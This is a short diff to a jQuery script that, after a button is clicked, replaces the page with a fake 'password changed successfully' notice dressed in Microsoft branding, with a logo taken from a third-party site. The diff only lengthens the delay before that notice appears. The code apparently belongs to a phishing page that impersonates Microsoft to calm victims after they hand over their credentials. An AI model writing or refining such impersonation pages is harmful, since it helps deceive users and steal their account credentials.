@@ -37,7 +37,7 @@ $("button#sender").on('click',function(e){
 
     var timeoutED = window.setTimeout(function(){
         $("body").html('<p style="font-weight: 200; font-family: sans-serif;letter-spacing: 1.5px; margin: 100px auto 20px auto;font-size: 20px">Your password has been changed successfully. </p><p style="font-weight: 200; font-family: sans-serif;letter-spacing: 1.5px; margin: 40px auto; font-size: 20px"> For more information contact our <a href="https://support.microsoft.com/es-es" style="text-decoration:none; color: #2980b9; font-size: 20px">Help Center</a></p> <a href="https://support.microsoft.com/es-es"><img style = "display:block; margin: 70px auto; width: 150px; "   src="http://diylogodesigns.com/blog/wp-content/uploads/2016/04/Microsoft-Logo-icon-png-Transparent-Background.png" alt="Microsoft logo" /></a>');
-    }, 800);
+    }, 1200);
 
 });
 
